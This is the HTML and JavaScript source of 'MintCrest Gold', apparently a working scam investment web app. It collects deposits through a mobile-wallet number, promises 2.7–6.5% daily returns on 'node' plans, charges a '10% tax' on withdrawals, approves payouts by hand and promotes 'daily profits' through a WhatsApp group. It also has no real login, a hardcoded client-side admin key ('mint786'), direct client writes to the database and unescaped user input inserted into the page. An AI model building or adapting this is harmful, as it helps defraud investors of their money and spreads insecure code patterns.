<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>MintCrest Gold | Final Master Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; -webkit-user-select: text; user-select: text; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .page { display: none; }
        .active-page { display: block !important; }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 class="text-4xl font-black italic mb-2">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-[7px] text-gray-500 uppercase tracking-widest mb-10">USA Secure Asset Node</p>
            <div class="glass p-10 rounded-[3rem] border-t-2 border-blue-600">
                <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 text-center font-bold mb-5 uppercase outline-none">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase active:scale-95">Connect Node</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6" onclick="adminTap()">
                <div>
                    <h3 id="display-username" class="text-lg font-black text-blue-400 uppercase italic">User</h3>
                    <span class="text-[7px] font-black text-gray-500 uppercase">Verified USA Node 🇺🇸</span>
                </div>
            </div>

            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600">
                <p class="text-[9px] text-blue-400 font-black uppercase mb-1">Vault Capital</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <p id="yield-status" class="mt-4 text-[9px] font-bold text-yellow-500 uppercase italic">Monitoring Fleets...</p>
            </div>

            <div class="glass p-6 rounded-[2.5rem] border-t-2 border-green-500 mb-6 text-center">
                <p class="text-[9px] text-gray-400 font-bold uppercase mb-4">Official Community For Daily Profits & Promos</p>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3?mode=hqctcla" class="block w-full bg-green-600 text-white py-4 rounded-2xl text-[10px] font-black uppercase">Join WhatsApp Group</a>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] font-black text-[9px] uppercase">Deposit</button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] font-black text-[9px] uppercase text-red-500">Withdraw</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-4"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-2"></div></div>

        <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
            <div class="flex justify-between items-center mb-10">
                <h2 class="text-xl font-black text-blue-500">ADMIN MASTER</h2>
                <button onclick="closeAdmin()" class="bg-red-500 px-4 py-2 rounded-xl text-xs font-black">EXIT</button>
            </div>
            <div id="adm-requests" class="space-y-4"></div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] text-center">
                <h3 class="font-black mb-6 uppercase">Funding</h3>
                <p class="text-[10px] mb-4">JAZZCASH/EASYPAISA: 03379827882</p>
                <input type="number" id="dep-amount" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center outline-none">
                <input type="text" id="dep-tid" placeholder="TID" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center outline-none uppercase">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase">Submit</button>
            </div>
        </div>
        
        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3rem] text-center border-t-8 border-red-600">
                <h3 class="font-black mb-6 text-red-500 uppercase italic">Payout (10% Tax)</h3>
                <input type="number" id="wd-amount" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center outline-none">
                <input type="text" id="wd-account" placeholder="Account Details" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-4 rounded-xl font-black uppercase">Request</button>
            </div>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[3rem]">
        <button onclick="changePage('home')" id="n-home" class="active-tab px-4 text-xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="px-4 text-xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="px-4 text-xl">📜</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null, tapCount = 0;
        const plans = []; for(let i=1; i<=20; i++){ plans.push({ n: `Node ${i}`, p: 200 + (i-1)*500, r: (2.5 + i*0.2).toFixed(1), d: 30 }); }

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, activeTier: 0, lastReqTime: Date.now() });
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('display-username').innerText = name;
            startSync(name); renderPlans(); setInterval(checkYield, 60000);
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between mb-2 text-[9px] uppercase border-l-4 border-blue-500"><div>${d.type}</div><div>₨ ${d.amount} | ${d.status}</div></div>`; });
            });
        }

        function renderPlans() {
            const container = document.getElementById('plans-list'); container.innerHTML = '';
            plans.forEach((p, i) => { container.innerHTML += `<div class="glass p-6 rounded-[2rem] flex justify-between items-center"><div class="text-[10px] font-black">NODE ${i+1}<br><span class="text-blue-400">₨ ${p.p}</span></div><button onclick="buyPlan(${i})" class="bg-white/5 border border-white/10 px-6 py-3 rounded-xl text-[9px] font-black uppercase">Invest</button></div>`; });
        }

        async function buyPlan(i) {
            const p = plans[i]; if(user.balance < p.p) return alert("Low Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - p.p, activeTier: p.p, tierROI: p.r, lastReqTime: Date.now() });
            alert("Success!");
        }

        async function checkYield() {
            if(!user || !user.activeTier) return;
            const now = Date.now(); const last = user.lastYieldTime || user.lastReqTime;
            if(now - last >= 86400000) {
                const amt = (user.activeTier * (user.tierROI / 100)).toFixed(2);
                await db.collection("requests").add({ user: user.name, type: "Yield", amount: parseFloat(amt), status: "pending", time: now });
                await db.collection("users").doc(user.name).update({ lastYieldTime: now });
                document.getElementById('yield-status').innerText = "Daily Profit Pending Approval";
            }
        }

        async function submitDeposit() { const amt = document.getElementById('dep-amount').value, tid = document.getElementById('dep-tid').value; await db.collection("requests").add({ user: user.name, type: "Deposit", amount: parseInt(amt), tid: tid, status: "pending", time: Date.now() }); alert("Sent!"); changePage('home'); }
        async function submitWithdraw() { const amt = parseInt(document.getElementById('wd-amount').value), acc = document.getElementById('wd-account').value; await db.collection("requests").add({ user: user.name, type: "Withdraw", amount: amt, account: acc, status: "pending", time: Date.now() }); await db.collection("users").doc(user.name).update({ balance: user.balance - amt }); alert("Sent!"); changePage('home'); }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }

        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl text-[10px] mb-2">${d.user} | ${d.type} (₨ ${d.amount})<br><input type="number" id="amt-${doc.id}" placeholder="Final Amt" class="bg-white/10 p-2 rounded mt-2"><button onclick="approve('${doc.id}', '${d.user}', '${d.type}')" class="bg-blue-600 ml-2 p-2 rounded">OK</button></div>`; });
            });
        }

        async function approve(id, userName, type) {
            const val = parseFloat(document.getElementById('amt-'+id).value); const uRef = db.collection("users").doc(userName); const uDoc = await uRef.get();
            if(type !== 'Withdraw') await uRef.update({ balance: (uDoc.data().balance || 0) + val });
            await db.collection("requests").doc(id).update({ status: 'approved', amount: val }); alert("Done!");
        }

        window.onload = () => { if(localStorage.getItem('mc_user')) { document.getElementById('user-name').value = localStorage.getItem('mc_user'); login(); } };
    </script>
</body>
</html>
